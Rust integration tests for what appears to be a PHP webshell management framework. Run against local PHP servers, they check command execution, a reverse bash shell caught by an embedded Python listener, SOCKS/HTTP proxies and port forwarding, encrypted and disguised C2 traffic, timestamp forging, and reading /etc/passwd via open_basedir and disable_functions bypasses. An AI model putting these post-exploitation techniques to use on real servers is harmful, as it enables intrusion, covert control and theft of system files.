        let _ = std::fs::remove_dir_all(&dir);
        result.unwrap_or_else(|error| panic!("哥斯拉扩展插件真实执行应成功：{error}"));
    }

    #[test]
    fn real_php_terminal_cd_support() {
        // 终端 cd：会话级 cwd 跟踪 + stub 端 chdir（每次命令前）
        let settings = settings();
        let Some((url, dir, mut child)) = spawn_php_server_with("native", "secret", false) else {
            eprintln!("跳过：未检测到 php");
            return;
        };
        let mut profile = profile(&url);
        profile.protocol_params = r#"{"encoder":"native"}"#.to_string();
        let result = (|| -> Result<(), ProtocolError> {
            let (session, info) = PhpProtocol.connect(&profile, &settings)?;
            assert_eq!(
                info.current_dir,
                dir.to_string_lossy(),
                "初始 cwd 应为 docroot"
            );
            let php = session
                .as_any()
                .downcast_ref::<PhpSession>()
                .expect("会话类型不匹配");
            // 1) pwd：初始目录
            let out = PhpProtocol.execute_command(session.as_ref(), "pwd", &settings)?;
            assert_eq!(out.cwd.as_deref(), Some(dir.to_string_lossy().as_ref()));
            // 2) cd 到 /tmp
            let out = PhpProtocol.execute_command(session.as_ref(), "cd /tmp", &settings)?;
            assert_eq!(out.cwd.as_deref(), Some("/tmp"), "cd 后 cwd 应更新");
            assert_eq!(php.current_dir(), "/tmp", "会话 cwd 应跟踪");
            // 3) pwd 验证新目录
            let out = PhpProtocol.execute_command(session.as_ref(), "pwd", &settings)?;
            assert_eq!(out.cwd.as_deref(), Some("/tmp"), "后续命令应在新目录执行");
            // 4) ls 新目录内容
            let out = PhpProtocol.execute_command(session.as_ref(), "ls", &settings)?;
            assert!(!out.stdout.is_empty(), "ls /tmp 应有输出");
            eprintln!(
                "[cd] {} -> /tmp 成功，ls {} 字节",
                info.current_dir,
                out.stdout.len()
            );
            Ok(())
        })();
        let _ = child.kill();
        let _ = child.wait();
        let _ = std::fs::remove_dir_all(&dir);
        result.unwrap_or_else(|error| panic!("终端 cd 真实执行应成功：{error}"));
    }

    #[test]
    fn real_php_reverse_shell_and_linpty() {
        // 虚拟终端（反弹 Shell）与超级终端（linpty 交互式 PTY）真实验证
        let mut settings = settings();
        settings.default_timeout_secs = 20; // 前台反弹需等待 listener 交互完成
        let Some((url, dir, mut child)) = spawn_php_server_with("native", "secret", false) else {
            eprintln!("跳过：未检测到 php");
            return;
        };
        let mut profile = profile(&url);
        profile.protocol_params = r#"{"encoder":"native"}"#.to_string();
        let listener_script = std::env::temp_dir().join("dosword_rev_listener.py");
        let _ = std::fs::write(&listener_script, REV_LISTENER);
        let result = (|| -> Result<(), ProtocolError> {
            let (session, _) = PhpProtocol.connect(&profile, &settings)?;
            let php = session
                .as_any()
                .downcast_ref::<PhpSession>()
                .expect("会话类型不匹配");
            let protocol = PhpProtocol;
            // 1) 虚拟终端：反弹 bash（无 PTY）
            let port: u16 = 24000 + (std::process::id() % 400) as u16;
            let outfile = std::env::temp_dir().join(format!("rev_out_{}.txt", std::process::id()));
            let _ = std::fs::remove_file(&outfile);
            let _listener = std::process::Command::new("python3")
                .arg(&listener_script)
                .arg(port.to_string())
                .arg(outfile.to_string_lossy().into_owned())
                .stdout(std::process::Stdio::null())
                .stderr(std::process::Stdio::null())
                .spawn()
                .ok();
            std::thread::sleep(std::time::Duration::from_millis(400));
            let out = dosword_sdk::feature_plugins::RealCmdPlugin.execute(
                &protocol, php, "php",
                &serde_json::json!({"host": "127.0.0.1", "port": port, "shell": "/bin/bash", "background": false}),
                &settings)?;
            let mode = out["mode"].as_str().unwrap_or("");
            assert!(mode == "background" || mode == "foreground", "{out:?}");
            // 等待 listener 交互完成
            let mut captured = String::new();
            for _ in 0..80 {
                if let Ok(content) = std::fs::read_to_string(&outfile) {
                    captured = content;
                    break;
                }
                std::thread::sleep(std::time::Duration::from_millis(250));
            }
            assert!(!captured.is_empty(), "反弹 shell 未建立连接：{captured}");
            assert!(captured.contains("uid="), "应收到 id 输出：{captured}");
            assert!(
                !captured.contains("/dev/pts"),
                "无 PTY 反弹的 tty 不应是伪终端：{captured}"
            );
            eprintln!("[plugin] real_cmd 反弹 shell ok（id 输出确认）");

            // 2) 正向交互式终端：SuperTerminalPlugin (start -> write -> read -> stop)
            let out_start = dosword_sdk::feature_plugins::SuperTerminalPlugin.execute(
                &protocol,
                php,
                "php",
                &serde_json::json!({"action": "start", "term_id": "test_term"}),
                &settings,
            )?;
            assert_eq!(out_start["ok"].as_bool(), Some(true), "{out_start:?}");
            std::thread::sleep(std::time::Duration::from_millis(300));

            // write "id\n"
            let id_b64 = "aWQK"; // base64 of "id\n"
            let out_write = dosword_sdk::feature_plugins::SuperTerminalPlugin.execute(
                &protocol,
                php,
                "php",
                &serde_json::json!({"action": "write", "term_id": "test_term", "data_b64": id_b64}),
                &settings,
            )?;
            assert_eq!(out_write["ok"].as_bool(), Some(true), "{out_write:?}");
            std::thread::sleep(std::time::Duration::from_millis(400));

            // read output
            let out_read = dosword_sdk::feature_plugins::SuperTerminalPlugin.execute(
                &protocol,
                php,
                "php",
                &serde_json::json!({"action": "read", "term_id": "test_term", "offset": 0}),
                &settings,
            )?;
            assert_eq!(out_read["ok"].as_bool(), Some(true), "{out_read:?}");
            eprintln!("[plugin] super_terminal forward PTY read ok: {out_read:?}");

            // stop terminal
            let _ = dosword_sdk::feature_plugins::SuperTerminalPlugin.execute(
                &protocol,
                php,
                "php",
                &serde_json::json!({"action": "stop", "term_id": "test_term"}),
                &settings,
            );
            eprintln!("[plugin] super_terminal forward PTY 完整生命周期测试 ok");
            Ok(())
        })();
        let _ = child.kill();
        let _ = child.wait();
        let _ = std::fs::remove_dir_all(&dir);
        result.unwrap_or_else(|error| panic!("反弹 shell / 正向终端真实执行应成功：{error}"));
    }

    /// Python 反弹 shell 监听器：接受连接 → 发 id → 收输出 → 发 tty → 收输出 → 写文件。
    const REV_LISTENER: &str = r#"
import socket, sys, time
port = int(sys.argv[1]); outfile = sys.argv[2]
srv = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
srv.setsockopt(socket.SOL_SOCKET, socket.SO_REUSEADDR, 1)
srv.bind(("127.0.0.1", port)); srv.listen(2)
# 就绪标记：测试轮询此文件而不是固定 sleep —— 监听只 accept 一次，
# 用 TCP 探活会把唯一的 accept 吃掉，故用标记文件通知「已在监听」
open(outfile + ".ready", "w").close()
srv.settimeout(20)
try:
    conn, _ = srv.accept()
    conn.settimeout(3)
    time.sleep(1.2)
    conn.sendall(b"id" + chr(10).encode())
    time.sleep(1.2)
    data = b""
    try:
        while True:
            chunk = conn.recv(4096)
            if not chunk: break
            data += chunk
            if len(data) > 800: break
    except socket.timeout:
        pass
    conn.sendall(b"tty" + chr(10).encode())
    time.sleep(1.2)
    data2 = b""
    try:
        while True:
            chunk = conn.recv(4096)
            if not chunk: break
            data2 += chunk
            if len(data2) > 800: break
    except socket.timeout:
        pass
    with open(outfile, "w") as f:
        f.write(repr(data) + chr(10) + "---" + chr(10) + repr(data2))
    conn.close()
except Exception as e:
    with open(outfile, "w") as f:
        f.write("ERR: " + str(e))
"#;

    #[test]
    fn driver_whitelist_accepts_all_six_and_rejects_others() {
        // 驱动白名单仍由客户端校验（防任意驱动字符串直达目标）；
        // DSN 拼装已下移到 stub 端实现（session/legacy 与 NATIVE 同构），
        // 因此这里只守住白名单，DSN 行为由 php_impl_matches_native_stub 与
        // 真实 PHP 往返测试覆盖。
        for driver in ["mysql", "pgsql", "sqlite", "mssql", "oracle", "redis"] {
            assert!(check_driver(driver).is_ok(), "{driver} 应在白名单内");
        }
        // Redis 曾经被 build_dsn 显式拒绝（"仅 NATIVE 编码器可用"），
        // 现在三条通道都由 stub 端裸 RESP 实现，不再拒绝
        assert!(check_driver("redis").is_ok(), "redis 应在白名单内");
        assert!(check_driver("mongodb").is_err(), "未知驱动必须拒绝");
    }

    /// AEAD：真实 PHP 往返（HKDF + AES-256-GCM + 序号递增 + 重放拒绝）。
    #[test]
    fn real_php_aead_round_trip() {
        let Some((url, dir, mut child)) = spawn_php_server_with("native_aead", "secret", false)
        else {
            eprintln!("跳过：未检测到 php");
            return;
        };
        let settings = settings();
        let mut profile = profile(&url);
        profile.protocol_params = r#"{"encoder":"native_aead"}"#.to_string();
        let result = (|| -> Result<(), ProtocolError> {
            let (session, _) = PhpProtocol.connect(&profile, &settings)?;
            // 多次操作：序号递增，stub 的防重放不应误拒
            for _ in 0..3 {
                let out =
                    PhpProtocol.execute_command(session.as_ref(), "printf aead-ok", &settings)?;
                assert_eq!(out.stdout, "aead-ok");
            }
            Ok(())
        })();
        let _ = child.kill();
        let _ = child.wait();
        let _ = std::fs::remove_dir_all(&dir);
        result.unwrap_or_else(|error| panic!("AEAD 真实往返应成功：{error}"));
    }

    /// AEAD 回归（真实 PHP）：
    ///
    /// 1. **重连必须可用** —— stub 的重放窗口存在目标机临时文件里、跨连接存活，
    ///    而客户端每次连接的序号都从 1 开始。窗口若不按连接隔离，第二次连接起
    ///    所有请求都会被判成重放，返回 `bad params`，会话**永久不可用**
    ///    （修复前实测如此）。
    /// 2. **连接内重放必须被拒** —— 同一帧原样重发第二次要失败。
    #[test]
    fn real_php_aead_reconnect_and_replay() {
        let Some((url, dir, mut child)) = spawn_php_server_with("native_aead", "secret", false)
        else {
            eprintln!("跳过：未检测到 php");
            return;
        };
        let settings = settings();
        let mut profile = profile(&url);
        profile.protocol_params = r#"{"encoder":"native_aead"}"#.to_string();
        let result = (|| -> Result<(String, String, String, String), ProtocolError> {
            // 1) 两次独立连接（同一密码）：第二次是新 sid，必须照常工作
            let (first, _) = PhpProtocol.connect(&profile, &settings)?;
            let one = PhpProtocol
                .execute_command(first.as_ref(), "printf conn-one", &settings)?
                .stdout;
            drop(first);
            let (second, _) = PhpProtocol.connect(&profile, &settings)?;
            let two = PhpProtocol
                .execute_command(second.as_ref(), "printf conn-two", &settings)?
                .stdout;
            drop(second);

            // 2) 手工构造一帧并原样重发：第二次必须被防重放拒绝
            let key = dosword_sdk::aead::derive_key("secret");
            let mut session = dosword_sdk::aead::AeadSession::new("secret");
            let frame = session
                .seal(br#"{"a":"exec","c":"printf replay-hit"}"#)
                .expect("封装帧");
            let token = session.token().to_string();
            let body = format!("formData={}", form_escape(&frame));
            let client = build_client(&settings);
            let post = |body: &str| -> Result<String, ProtocolError> {
                let response = client
                    .post(&url)
                    .header("Content-Type", "application/x-www-form-urlencoded")
                    .header("X-Debug-Key", &token)
                    .body(body.to_string())
                    .send()
                    .map_err(|error| ProtocolError::Network(error.to_string()))?;
                let text = response
                    .text()
                    .map_err(|error| ProtocolError::Network(error.to_string()))?;
                let outer: serde_json::Value = serde_json::from_str(&text)
                    .map_err(|_| ProtocolError::ParseError("响应不是合法 JSON".into()))?;
                let data = outer
                    .get("data")
                    .and_then(|value| value.as_str())
                    .ok_or_else(|| ProtocolError::ParseError("响应缺少 data".into()))?;
                let data = crate::protocol::transport::gunzip_if_needed(data);
                let (_, plain) =
                    dosword_sdk::aead::open(&key, dosword_sdk::aead::DIR_RESPONSE, &data)
                        .map_err(ProtocolError::ParseError)?;
                Ok(String::from_utf8_lossy(&plain).to_string())
            };
            let accepted = post(&body)?;
            let replayed = post(&body)?;
            Ok((one, two, accepted, replayed))
        })();
        let _ = child.kill();
        let _ = child.wait();
        let _ = std::fs::remove_dir_all(&dir);
        let (one, two, accepted, replayed) =
            result.unwrap_or_else(|error| panic!("AEAD 重连/重放测试失败：{error}"));
        assert_eq!(one, "conn-one");
        assert_eq!(two, "conn-two");
        // exec 的 stdout 在响应里是 base64（cmVwbGF5LWhpdA== = replay-hit）
        assert!(
            accepted.contains("cmVwbGF5LWhpdA=="),
            "首帧应被正常执行：{accepted}"
        );
        assert!(
            replayed.contains("bad params"),
            "原样重放必须被防重放拒绝：{replayed}"
        );
    }

    /// 加盐派生：stub 用 `salt:password` 生成，客户端用「原密码 + 盐」连接。
    #[test]
    fn salted_key_derivation_round_trip() {
        let salt = "abc123def4567890";
        let effective = format!("{salt}:secret");
        let Some((url, dir, mut child)) = spawn_php_server_with("native", &effective, false) else {
            eprintln!("跳过：未检测到 php");
            return;
        };
        let settings = settings();
        let mut profile = profile(&url);
        profile.password = "secret".to_string();
        profile.protocol_params = format!(r#"{{"encoder":"native","salt":"{salt}"}}"#);
        let result = (|| -> Result<String, ProtocolError> {
            let (session, _) = PhpProtocol.connect(&profile, &settings)?;
            let out = PhpProtocol.execute_command(session.as_ref(), "printf salt-ok", &settings)?;
            Ok(out.stdout)
        })();
        let _ = child.kill();
        let _ = child.wait();
        let _ = std::fs::remove_dir_all(&dir);
        assert_eq!(
            result
                .unwrap_or_else(|error| panic!("加盐往返应成功：{error}"))
                .trim(),
            "salt-ok"
        );
    }

    /// 请求调试必须覆盖默认通道：NATIVE（native_call）与分阶段（session_post）。
    /// 此前两者都不调用 record_request，「请求调试」页在默认编码器下永远是空的。
    #[test]
    fn request_debug_records_native_and_session_channels() {
        let settings = settings();
        for (encoder_id, session_mode) in [("native", false), ("xor_session", true)] {
            let Some((url, dir, mut child)) =
                spawn_php_server_with(encoder_id, "secret", session_mode)
            else {
                eprintln!("跳过：未检测到 php");
                return;
            };
            crate::protocol::reqlog::clear_requests();
            let mut profile = profile(&url);
            profile.protocol_params = format!(r#"{{"encoder":"{encoder_id}"}}"#);
            let (session, _) = PhpProtocol.connect(&profile, &settings).unwrap();
            let _ = PhpProtocol
                .execute_command(session.as_ref(), "id", &settings)
                .unwrap();
            let records = crate::protocol::reqlog::list_requests(Some(&url), None);
            assert!(!records.is_empty(), "{encoder_id} 通道应产生请求调试记录");
            let _ = child.kill();
            let _ = child.wait();
            let _ = std::fs::remove_dir_all(&dir);
        }
    }

    /// 未知编码器必须显式报错，而不是静默回退 NATIVE_XOR ——
    /// 后者会把「拼错的 id」变成「用不相干的编码器发请求」，表现为莫名的解密失败。
    #[test]
    fn unknown_encoder_id_is_rejected() {
        let err = match encoder_for(r#"{"encoder":"does_not_exist"}"#) {
            Ok(encoder) => panic!("应拒绝未知编码器，实际解析为 {}", encoder.id()),
            Err(error) => error,
        };
        assert!(err.to_string().contains("未注册的编码器"), "{err}");
        // 未配置 encoder 时仍回退 NATIVE_XOR（兼容旧配置与旧 stub）
        assert_eq!(encoder_for("{}").unwrap().id(), "native");
        // 新注册的编码器可正常解析
        assert_eq!(
            encoder_for(r#"{"encoder":"base64"}"#).unwrap().id(),
            "base64"
        );
        assert_eq!(
            encoder_for(r#"{"encoder":"xor_session"}"#).unwrap().id(),
            "xor_session"
        );
    }

    #[test]
    fn run_code_disabled_gate() {
        // S1：allow_arbitrary_code=false 时 run_code 拒绝执行任意代码
        let Some((url, dir, mut child)) = spawn_php_server_with("native", "secret", false) else {
            return;
        };
        let mut settings = settings();
        settings.allow_arbitrary_code = false;
        let mut profile1 = profile(&url);
        profile1.protocol_params = r#"{"encoder":"native"}"#.to_string();
        let result = (|| -> Result<(), ProtocolError> {
            let (session, _) = PhpProtocol.connect(&profile1, &settings)?;
            let php = session
                .as_any()
                .downcast_ref::<PhpSession>()
                .expect("会话类型不匹配");
            let protocol = PhpProtocol;
            let err = protocol
                .run_code(php, "php", "<?php echo 1;", &settings)
                .unwrap_err();
            assert!(err.to_string().contains("已禁用"), "{err}");
            eprintln!("[s1] run_code 门禁拒绝任意代码");
            Ok(())
        })();
        let _ = child.kill();
        let _ = child.wait();
        let _ = std::fs::remove_dir_all(&dir);
        result.unwrap_or_else(|error| panic!("run_code 门禁测试应成功：{error}"));
    }

    #[test]
    fn real_php_proxy_start_stop() {
        // Socks/HTTP 代理：start（后台驻留）→ stop（pid 文件 kill）闭环
        let Some((url, dir, mut child)) = spawn_php_server_with("native", "secret", false) else {
            return;
        };
        let settings = settings();
        let mut profile1 = profile(&url);
        profile1.protocol_params = r#"{"encoder":"native"}"#.to_string();
        let result = (|| -> Result<(), ProtocolError> {
            let (session, _) = PhpProtocol.connect(&profile1, &settings)?;
            let php = session
                .as_any()
                .downcast_ref::<PhpSession>()
                .expect("会话类型不匹配");
            let protocol = PhpProtocol;
            // Socks：start
            let port = 18000 + (std::process::id() % 500) as u32;
            let out = dosword_sdk::feature_plugins::SocksProxyPlugin.execute(
                &protocol,
                php,
                "php",
                &serde_json::json!({"port": port}),
                &settings,
            )?;
            assert_eq!(out["ok"].as_bool(), Some(true), "{out:?}");
            let pid = out["pid"].as_u64().unwrap_or(0);
            assert!(pid > 0, "后台驻留应返回子进程 pid：{out:?}");
            eprintln!("[proxy] socks start pid={pid}");
            std::thread::sleep(std::time::Duration::from_millis(300));
            // Socks：stop
            let out = dosword_sdk::feature_plugins::SocksProxyPlugin.execute(
                &protocol,
                php,
                "php",
                &serde_json::json!({"port": port, "action": "stop"}),
                &settings,
            )?;
            assert_eq!(out["ok"].as_bool(), Some(true), "{out:?}");
            assert_eq!(
                out["stopped"].as_bool(),
                Some(true),
                "应成功停止代理：{out:?}"
            );
            // Socks：start (带用户名/密码认证)
            let port_auth = port + 2;
            let out_auth = dosword_sdk::feature_plugins::SocksProxyPlugin.execute(
                &protocol,
                php,
                "php",
                &serde_json::json!({"port": port_auth, "username": "admin", "password": "pass"}),
                &settings,
            )?;
            assert_eq!(out_auth["ok"].as_bool(), Some(true), "{out_auth:?}");
            assert_eq!(out_auth["auth"].as_bool(), Some(true), "{out_auth:?}");
            std::thread::sleep(std::time::Duration::from_millis(300));
            let _ = dosword_sdk::feature_plugins::SocksProxyPlugin.execute(
                &protocol,
                php,
                "php",
                &serde_json::json!({"port": port_auth, "action": "stop"}),
                &settings,
            );
            eprintln!("[proxy] socks with auth start & stop 成功");
            // NetworkProxy: forward (端口转发) start + stop
            let port_fwd = port + 4;
            let out_fwd = dosword_sdk::feature_plugins::NetworkProxyPlugin.execute(
                &protocol,
                php,
                "php",
                &serde_json::json!({"proxy_type": "forward", "port": port_fwd, "target_host": "127.0.0.1", "target_port": 80}),
                &settings,
            )?;
            assert_eq!(out_fwd["ok"].as_bool(), Some(true), "{out_fwd:?}");
            std::thread::sleep(std::time::Duration::from_millis(300));
            let _ = dosword_sdk::feature_plugins::NetworkProxyPlugin.execute(
                &protocol,
                php,
                "php",
                &serde_json::json!({"proxy_type": "forward", "port": port_fwd, "action": "stop"}),
                &settings,
            );
            eprintln!("[proxy] network_proxy forward start & stop 成功");

            // NetworkProxy: map (端口映射) start + stop
            let port_map = port + 5;
            let out_map = dosword_sdk::feature_plugins::NetworkProxyPlugin.execute(
                &protocol,
                php,
                "php",
                &serde_json::json!({"proxy_type": "map", "remote_host": "127.0.0.1", "remote_port": port_map, "target_host": "127.0.0.1", "target_port": 80}),
                &settings,
            )?;
            assert_eq!(out_map["ok"].as_bool(), Some(true), "{out_map:?}");
            std::thread::sleep(std::time::Duration::from_millis(300));
            let _ = dosword_sdk::feature_plugins::NetworkProxyPlugin.execute(
                &protocol,
                php,
                "php",
                &serde_json::json!({"proxy_type": "map", "remote_port": port_map, "action": "stop"}),
                &settings,
            );
            eprintln!("[proxy] network_proxy map start & stop 成功");

            // Direct standalone PortForwardPlugin
            let pf_port = port + 6;
            let out_pf = dosword_sdk::feature_plugins::PortForwardPlugin.execute(
                &protocol,
                php,
                "php",
                &serde_json::json!({"port": pf_port, "target_host": "127.0.0.1", "target_port": 80}),
                &settings,
            )?;
            assert_eq!(out_pf["ok"].as_bool(), Some(true), "{out_pf:?}");
            std::thread::sleep(std::time::Duration::from_millis(300));
            let _ = dosword_sdk::feature_plugins::PortForwardPlugin.execute(
                &protocol,
                php,
                "php",
                &serde_json::json!({"port": pf_port, "action": "stop"}),
                &settings,
            );
            eprintln!("[proxy] standalone PortForwardPlugin start & stop 成功");

            // Direct standalone PortMapPlugin
            let pm_port = port + 7;
            let out_pm = dosword_sdk::feature_plugins::PortMapPlugin.execute(
                &protocol,
                php,
                "php",
                &serde_json::json!({"remote_host": "127.0.0.1", "remote_port": pm_port, "target_host": "127.0.0.1", "target_port": 80}),
                &settings,
            )?;
            assert_eq!(out_pm["ok"].as_bool(), Some(true), "{out_pm:?}");
            std::thread::sleep(std::time::Duration::from_millis(300));
            let _ = dosword_sdk::feature_plugins::PortMapPlugin.execute(
                &protocol,
                php,
                "php",
                &serde_json::json!({"remote_port": pm_port, "action": "stop"}),
                &settings,
            );
            eprintln!("[proxy] standalone PortMapPlugin start & stop 成功");
            // HTTP：start + stop
            let hport = port + 1;
            let out = dosword_sdk::feature_plugins::HttpProxyPlugin.execute(
                &protocol,
                php,
                "php",
                &serde_json::json!({"port": hport}),
                &settings,
            )?;
            assert_eq!(out["ok"].as_bool(), Some(true), "{out:?}");
            eprintln!(
                "[proxy] http start pid={}",
                out["pid"].as_u64().unwrap_or(0)
            );
            std::thread::sleep(std::time::Duration::from_millis(300));
            let out = dosword_sdk::feature_plugins::HttpProxyPlugin.execute(
                &protocol,
                php,
                "php",
                &serde_json::json!({"port": hport, "action": "stop"}),
                &settings,
            )?;
            assert_eq!(
                out["stopped"].as_bool(),
                Some(true),
                "应成功停止 HTTP 代理：{out:?}"
            );
            eprintln!("[proxy] http stop 成功");
            // HTTP：start (带用户名/密码认证) + stop
            let hport_auth = port + 3;
            let out_h_auth = dosword_sdk::feature_plugins::HttpProxyPlugin.execute(
                &protocol,
                php,
                "php",
                &serde_json::json!({"port": hport_auth, "username": "admin", "password": "pass"}),
                &settings,
            )?;
            assert_eq!(out_h_auth["ok"].as_bool(), Some(true), "{out_h_auth:?}");
            assert_eq!(out_h_auth["auth"].as_bool(), Some(true), "{out_h_auth:?}");
            std::thread::sleep(std::time::Duration::from_millis(300));
            let _ = dosword_sdk::feature_plugins::HttpProxyPlugin.execute(
                &protocol,
                php,
                "php",
                &serde_json::json!({"port": hport_auth, "action": "stop"}),
                &settings,
            );
            eprintln!("[proxy] http with auth start & stop 成功");
            // 连接信息丰富：probe 应带回 SAPI/扩展/禁用函数
            let probe = PhpProtocol
                .session_probe(php, &settings)
                .unwrap_or_else(|_| panic!("probe 应成功"));
            assert!(!probe.php_sapi.is_empty(), "SAPI 应探测到");
            assert!(!probe.extensions.is_empty(), "扩展列表应非空");
            eprintln!(
                "[info] sapi={} arch={} extensions={} disable={}",
                probe.php_sapi,
                probe.arch,
                probe.extensions.len(),
                probe.disable_functions
            );
            Ok(())
        })();
        let _ = child.kill();
        let _ = child.wait();
        let _ = std::fs::remove_dir_all(&dir);
        result.unwrap_or_else(|error| panic!("代理开关真实执行应成功：{error}"));
    }

    #[test]
    fn real_php_touch_path() {
        // touch：写文件 → 修改时间戳（过去 epoch）→ listDir 验证 mtime 变化
        let Some((url, dir, mut child)) = spawn_php_server_with("native", "secret", false) else {
            return;
        };
        let settings = settings();
        let mut profile1 = profile(&url);
        profile1.protocol_params = r#"{"encoder":"native"}"#.to_string();
        let result = (|| -> Result<(), ProtocolError> {
            let (session, _) = PhpProtocol.connect(&profile1, &settings)?;
            let _php = session
                .as_any()
                .downcast_ref::<PhpSession>()
                .expect("会话类型不匹配");
            let protocol = PhpProtocol;
            let file = format!("{}/touch_me.txt", dir.display());
            protocol.write_file(session.as_ref(), &file, b"hello", &settings)?;
            let before =
                protocol.list_dir(session.as_ref(), dir.to_str().unwrap_or("/"), &settings)?;
            let before_mtime = before
                .entries
                .iter()
                .find(|e| e.name == "touch_me.txt")
                .map(|e| e.modified.clone())
                .unwrap_or_default();
            // touch 到 2020-01-01（epoch=1577836800）
            protocol.touch_path(session.as_ref(), &file, 1_577_836_800, &settings)?;
            let after =
                protocol.list_dir(session.as_ref(), dir.to_str().unwrap_or("/"), &settings)?;
            let after_mtime = after
                .entries
                .iter()
                .find(|e| e.name == "touch_me.txt")
                .map(|e| e.modified.clone())
                .unwrap_or_default();
            assert_ne!(
                before_mtime, after_mtime,
                "touch 后 mtime 应改变：{before_mtime} -> {after_mtime}"
            );
            // mtime 以本地时区显示（format_timestamp），不能用固定 "2020-01-01" 断言
            let expected_mtime = format_timestamp(1_577_836_800);
            assert_eq!(
                after_mtime, expected_mtime,
                "touch 后 mtime 应等于 2020-01-01（本地时区表示）：{after_mtime}"
            );
            eprintln!("[touch] {before_mtime} -> {after_mtime}");
            Ok(())
        })();
        let _ = child.kill();
        let _ = child.wait();
        let _ = std::fs::remove_dir_all(&dir);
        result.unwrap_or_else(|error| panic!("touch 真实执行应成功：{error}"));
    }

    #[test]
    fn real_php_open_basedir_bypass() {
        let settings = settings();
        // 1) 未启用 open_basedir：direct 读取 + 目录列举
        let Some((url, dir, mut child)) = spawn_php_server_with("native", "secret", false) else {
            return;
        };
        let mut profile1 = profile(&url);
        profile1.protocol_params = r#"{"encoder":"native"}"#.to_string();
        let result = (|| -> Result<(), ProtocolError> {
            let (session, _) = PhpProtocol.connect(&profile1, &settings)?;
            let php = session
                .as_any()
                .downcast_ref::<PhpSession>()
                .expect("会话类型不匹配");
            let protocol = PhpProtocol;
            // 文件读取（direct）
            let out = dosword_sdk::feature_plugins::BypassOpenBasedirPlugin.execute(
                &protocol,
                php,
                "php",
                &serde_json::json!({"path": "/etc/passwd"}),
                &settings,
            )?;
            assert_eq!(out["ok"].as_bool(), Some(true), "{out:?}");
            assert!(out["content"].as_str().unwrap_or("").contains("root:"));
            assert_eq!(out["method_used"].as_str(), Some("direct"));
            eprintln!("[ob] 未启用环境 direct 读取成功");
            // 目录列举（direct）
            let out = dosword_sdk::feature_plugins::BypassOpenBasedirPlugin.execute(
                &protocol,
                php,
                "php",
                &serde_json::json!({"path": "/etc"}),
                &settings,
            )?;
            assert_eq!(out["ok"].as_bool(), Some(true), "{out:?}");
            let entries = out["entries"].as_array().map(|a| a.len()).unwrap_or(0);
            assert!(entries > 0, "应列举到 /etc 内容：{out:?}");
            eprintln!("[ob] 未启用环境 direct 列举 {} 项", entries);
            Ok(())
        })();
        let _ = child.kill();
        let _ = child.wait();
        let _ = std::fs::remove_dir_all(&dir);
        result.unwrap_or_else(|error| panic!("未启用环境 open_basedir 真实执行应成功：{error}"));

        // 2) 受限环境（open_basedir=临时目录）：scan 正确评估 + 正确报告当前环境不可绕过（PHP 8）
        let dir2 = std::env::temp_dir().join(format!("dosword-ob-{}", uuid::Uuid::new_v4()));
        std::fs::create_dir_all(&dir2).unwrap();
        let encoder = dosword_sdk::EncoderRegistry::global()
            .get("native")
            .unwrap();
        std::fs::write(
            dir2.join("shell.php"),
            encoder.stub("php", "secret").unwrap(),
        )
        .unwrap();
        let port = {
            use std::net::TcpListener;
            let listener = TcpListener::bind("127.0.0.1:0").unwrap();
            listener.local_addr().unwrap().port()
        };
        let Some(mut child) = std::process::Command::new("php")
            .arg("-d")
            .arg(format!("open_basedir={}", dir2.display()))
            .arg("-S")
            .arg(format!("127.0.0.1:{port}"))
            .arg("-t")
            .arg(&dir2)
            .current_dir(&dir2)
            .stdout(std::process::Stdio::null())
            .stderr(std::process::Stdio::null())
            .spawn()
            .ok()
        else {
            return;
        };
        if !crate::protocol::wait_http_ready(port, 10_000) {
            eprintln!("跳过 open_basedir 用例：php 服务器未在 10 秒内就绪");
            return;
        }
        let url2 = format!("http://127.0.0.1:{port}/shell.php");
        let mut profile2 = profile(&url2);
        profile2.protocol_params = r#"{"encoder":"native"}"#.to_string();
        let result2 = (|| -> Result<(), ProtocolError> {
            let (session, _) = PhpProtocol.connect(&profile2, &settings)?;
            let php = session
                .as_any()
                .downcast_ref::<PhpSession>()
                .expect("会话类型不匹配");
            let protocol = PhpProtocol;
            let out = dosword_sdk::feature_plugins::BypassOpenBasedirPlugin.execute(
                &protocol,
                php,
                "php",
                &serde_json::json!({"path": "/etc/passwd"}),
                &settings,
            )?;
            assert_eq!(out["ok"].as_bool(), Some(false), "PHP 8 不应绕过：{out:?}");
            assert_eq!(out["methods"]["symlink_out"].as_bool(), Some(false));
            assert_eq!(out["methods"]["chdir"].as_bool(), Some(false));
            assert_eq!(out["methods"]["ini_set"].as_bool(), Some(false));
            assert!(out["error"].as_str().unwrap_or("").contains("无法绕过"));
            eprintln!("[ob] 受限环境正确评估（symlink/chdir/ini_set 均被拦截）");
            Ok(())
        })();
        let _ = child.kill();
        let _ = child.wait();
        let _ = std::fs::remove_dir_all(&dir2);
        result2.unwrap_or_else(|error| panic!("受限环境 open_basedir 评估应成功：{error}"));
    }

    #[test]
    fn real_php_bypass_vectors_disabled_env() {
        // 模拟 exec/system/passthru/shell_exec/popen/escapeshellcmd/proc_open 全禁环境，
        // 验证 PHP 8+ 剩余可用向量
        let settings = settings();
        // 自定义 spawn：带 -d disable_functions
        let php = std::process::Command::new("php").arg("-v").output().ok();
        if php.is_none() {
            return;
        }
        let encoder = dosword_sdk::EncoderRegistry::global()
            .get("native")
            .unwrap();
        let dir =
            std::env::temp_dir().join(format!("dosword-php-disable-{}", uuid::Uuid::new_v4()));
        std::fs::create_dir_all(&dir).unwrap();
        let stub = encoder.stub("php", "secret").unwrap();
        std::fs::write(dir.join("shell.php"), &stub).unwrap();
        let port = {
            use std::net::TcpListener;
            let listener = TcpListener::bind("127.0.0.1:0").unwrap();
            listener.local_addr().unwrap().port()
        };
        let disabled =
            "exec,system,passthru,shell_exec,popen,escapeshellcmd,proc_open,proc_nice,ini_restore";
        let child = std::process::Command::new("php")
            .arg("-d")
            .arg(format!("disable_functions={disabled}"))
            .arg("-S")
            .arg(format!("127.0.0.1:{port}"))
            .arg("-t")
            .arg(&dir)
            .current_dir(&dir)
            .stdout(std::process::Stdio::null())
            .stderr(
                if let Ok(f) = std::fs::File::create(std::env::temp_dir().join("srv2.log")) {
                    std::process::Stdio::from(f)
                } else {
                    std::process::Stdio::null()
                },
            )
            .spawn();
        let Some(mut child) = child.ok() else {
            return;
        };
        if !crate::protocol::wait_http_ready(port, 10_000) {
            eprintln!("跳过：php 服务器未在 10 秒内就绪");
            let _ = child.kill();
            return;
        }
        let url = format!("http://127.0.0.1:{port}/shell.php");
        let mut profile = profile(&url);
